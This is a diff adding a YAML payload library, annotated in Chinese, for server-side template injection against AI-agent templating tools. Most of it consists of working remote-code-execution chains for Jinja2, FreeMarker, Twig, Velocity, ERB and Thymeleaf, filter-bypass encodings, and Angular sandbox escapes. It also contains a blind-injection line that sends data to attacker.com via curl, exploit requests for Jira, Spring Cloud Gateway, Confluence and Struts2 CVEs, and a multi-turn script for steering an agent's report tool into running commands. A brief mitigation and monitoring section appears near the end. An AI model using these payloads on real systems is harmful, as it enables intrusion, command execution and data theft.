@@ -1,0 +1,248 @@
+# SSTI — Agent 场景适配 Payload 库
+# 适配点：Agent 工具如 render_template / generate_report / format_email
+# 用户输入直接拼入模板字符串 → SSTI
+
+metadata:
+  source: codeaudit/hack-skills/ssti-server-side-template-injection
+  scope: agent tool call params → template render
+  layer: L3_tool_call (模板类工具) + L1_user_input (system prompt 拼接)
+  sink_patterns:
+    - "render_template_string(user_input)"
+    - "jinja2.Template(user_input).render()"
+    - "Twig.render(user_input)"
+    - "Velocity.evaluate(user_input)"
+
+# ============ 1. 检测 probes ============
+detection:
+  polyglot:
+    - payload: "${{<%[%'\"}}%\\."
+      purpose: 多引擎 polyglot 探测
+  math_probes:
+    - probe: "{{7*7}}"
+      resolves_to: 49
+      engines: [Jinja2, Twig, Nunjucks, Handlebars]
+    - probe: "${7*7}"
+      resolves_to: 49
+      engines: [FreeMarker, Velocity, EL, Thymeleaf]
+    - probe: "<%= 7*7 %>"
+      resolves_to: 49
+      engines: [ERB, EJS, EEx]
+    - probe: "#{7*7}"
+      resolves_to: 49
+      engines: [Pug, Ruby interpolation]
+    - probe: "@(7*7)"
+      resolves_to: 49
+      engines: [Razor]
+    - probe: "{7*7}"
+      resolves_to: 49
+      engines: [Smarty]
+  disambiguation:
+    jinja2_vs_twig:
+      - payload: "{{7*'7'}}"
+        jinja2: "7777777"
+        twig: "49"
+
+# ============ 2. Jinja2 RCE 链（Python Flask）============
+jinja2:
+  description: Python 模板引擎，Agent 报告/邮件渲染最常用
+  chains:
+    os_globals:
+      - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    request_object:
+      - "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}"
+    lipsum:
+      - "{{lipsum.__globals__.os.popen('id').read()}}"
+    cycler:
+      - "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+    mro_subclass:
+      - "{{''.__class__.__mro__[1].__subclasses__()[258]('id',shell=True,stdout=-1).communicate()[0]}}"
+      - description: index 258 是 subprocess.Popen（视 Python 版本而定）
+    joiner_filter:
+      - "{{''.__class__.__mro__[1].__subclasses__()|attr('index')(subclasses_for('Popen'))}}"
+  bypass:
+    no_underscore:
+      - "''|attr('\\x5f\\x5fclass\\x5f\\x5f')"
+      - "request|attr('args')|attr('__class__')"
+    no_dot:
+      - "config['SECRET_KEY']"
+      - "''['__class__']"
+    no_keywords:
+      - "|attr('\\x5f\\x5fclass\\x5f\\x5f')"
+      - "|attr('\\x5f\\x5fm\\x72\\x6f\\x5f\\x5f')"
+    safe_filter:
+      - "{{payload|safe}}"
+
+# ============ 3. FreeMarker（Java Spring）============
+freemarker:
+  exec_via_utility:
+    - '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
+  via_object_constructor:
+    - |
+      <#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
+      <#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.lang.Runtime")?api.exec("id").inputStream))>
+      ${br.readLine()}
+  api:
+    - '<#assign classLoader=object?api.classLoader><#assign clazz=classLoader.loadClass("java.lang.Runtime")>'
+
+# ============ 4. Twig（PHP）============
+twig:
+  v1:
+    - "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}"
+    - "{{_self.env.getFilter(\"id\")}}"
+  v2:
+    - "{{['id']|map('system')|join}}"
+  filter_map:
+    - "{{app.request.server.all|join(',')}}"
+  constants:
+    - "{{constant('PHP_VERSION')}}"
+
+# ============ 5. Velocity（Java）============
+velocity:
+  rce_via_runtime:
+    - |
+      #set($str=$class.inspect("java.lang.Runtime").method.invoke($class.inspect("java.lang.Runtime").type, null))
+      #set($run=$str.exec("id"))
+      #set($out=$run.inputStream)
+  alternative:
+    - |
+      #set($class=$currentNode.getClass())
+      #set($rt=$class.forName("java.lang.Runtime"))
+      #set($proc=$rt.getMethod("exec",$class.forName("java.lang.String")).invoke($rt.getMethod("getRuntime").invoke(null),"id"))
+
+# ============ 6. ERB（Ruby）============
+erb:
+  basic:
+    - "<%= system('id') %>"
+    - "<%= `id` %>"
+    - "<%= IO.popen('id').read %>"
+  file_read:
+    - "<%= File.read('/etc/passwd') %>"
+
+# ============ 7. Thymeleaf（Java Spring）============
+thymeleaf:
+  spel_injection:
+    - "__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::type"
+  fragment_expression:
+    - '__${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream())}__::type'
+
+# ============ 8. Client-Side Template Injection（CSTI）============
+csti:
+  angular_1x:
+    - "{{constructor.constructor('alert(1)')()}}"
+  angular_15x:
+    - "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}"
+  angular_13x:
+    - "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}"
+  detection:
+    - "{{1+1}}"
+      signal: returns 2
+
+# ============ 9. 盲 SSTI（无回显）============
+blind_ssti:
+  boolean:
+    - "{{3*4/2}}"
+    - "3*)2(/4"
+  time_based:
+    - "{{sleep(5)}}"
+  oob:
+    - "{{config.__class__.__init__.__globals__['os'].popen('curl http://attacker.com/?data=' + self.__dict__).read()}}"
+  error_based:
+    - "(1/0).zxy.zxy"
+
+# ============ 10. 通用入口点 ============
+entry_points:
+  flask:
+    - "render_template_string(user_input)  # 最危险"
+    - "render_template('page.html', user_data=user_input)"
+    - "Environment.from_string(user_input).render()"
+  jinja2:
+    - "Template(user_input).render()"
+  fastapi:
+    - "templates.TemplateResponse(request, 'page.html', {'data': user_input})"
+  django:
+    - "Django 模板本身较安全，但 format_html 拼接可能 RCE"
+
+# ============ 11. Agent 场景特化 ============
+agent_specific:
+  description: |
+    Agent 工具调用场景下 SSTI 的特殊考虑：
+    1. Agent 报告生成工具（如 generate_report / format_email）常接收模板+数据
+    2. 数据中可能包含不可信内容（如用户上传的报告摘要）
+    3. 系统提示词拼接不当也可能 SSTI（少见但可能）
+  high_risk_tool_patterns:
+    - name: "render_template"
+      severity: critical
+    - name: "generate_report"
+      severity: high
+    - name: "format_email"
+      severity: high
+    - name: "create_html"
+      severity: high
+    - name: "render_string"
+      severity: critical
+    - name: "build_response"
+      severity: medium
+  multi_turn_strategy:
+    turn_1: "询问工具：'generate_report 接受什么参数？模板是写死还是用户传？'"
+    turn_2: "提交简单数据：'渲染模板，内容=hello'"
+    turn_3: "注入探测：'内容={{7*7}}'"
+    turn_4: "RCE：'内容={{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}'"
+  system_prompt_ssti:
+    description: |
+      系统提示词如果拼接用户输入且被作为模板渲染，可能 SSTI
+    detection:
+      - "搜索代码中 render_template_string / Template() 调用是否包含 system_prompt"
+      - "搜索 f-string 拼接进入 render_template"
+    mitigation:
+      - "使用参数化渲染（占位符 → 变量替换）"
+      - "不要直接渲染用户输入为模板"
+
+# ============ 12. Flask Debug PIN 计算 ============
+flask_debug_pin:
+  description: |
+    Flask debug mode + PIN 暴露 → RCE
+  prerequisites:
+    - "Werkzeug debugger enabled（debug=True）"
+    - "能获取以下 6 个值（通过 SSRF / LFI / 命令执行）"
+  required_values:
+    - "/etc/passwd 中的 username"
+    - "Module name (flask.app)"
+    - "Application path"
+    - "/sys/class/net/eth0/address (MAC)"
+    - "/etc/machine-id 或 /proc/sys/kernel/random/boot_id"
+    - "/proc/self/cgroup 第一行"
+  tools:
+    - "https://github.com/Paradoxis/Flask-Unsign"
+    - "https://github.com/knownsec/calc_flask_pin"
+
+# ============ 13. CVE 案例 ============
+cves:
+  jira_cve_2019_11581:
+    description: Velocity SSTI via Contact Administrators form
+    payload: |
+      POST /secure/ContactAdministrators!default.jspa
+      subject=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id').getText()
+  spring_cloud_gateway_cve_2022_22947:
+    description: SpEL injection in actuator routes
+    payload: |
+      POST /actuator/gateway/routes/test
+      {"filters":[{"name":"AddResponseHeader","args":{"name":"X-Test","value":"#{T(java.lang.Runtime).getRuntime().exec('id')}"}]}
+  confluence_cve_2021_26084:
+    description: OGNL injection in Wiki markup
+    payload: |
+      /pages/createpage-entervariables.action?queryString=foo
+      queryString=%5Cu0027%2B%23%7B%5Cu0022%2B%5Cu0022%29%5Cu0029%7D%2B%5Cu0027
+  struts2_s2_045:
+    description: OGNL via Content-Type header
+    payload: |
+      Content-Type: %{(#_='multipart/form-data').(OGNL).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(#b=#a.getInputStream()).(#c=new java.io.InputStreamReader(#b)).(#d=new java.io.BufferedReader(#c)).(#out=#ct.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter()).(#out.println(#d.readLine())).(#out.flush()).(#out.close())}
+
+# ============ 14. 沙箱监控 ============
+sandbox_monitoring:
+  process_monitoring:
+    - "python / jvm / node 进程派生 shell（/bin/sh, cmd.exe）"
+  network_monitoring:
+    - "agent 进程外联 DNS / HTTP 到 attacker.com"
+  file_monitoring:
+    - "/etc/passwd 读取"
+    - "/tmp/ 创建可执行文件"
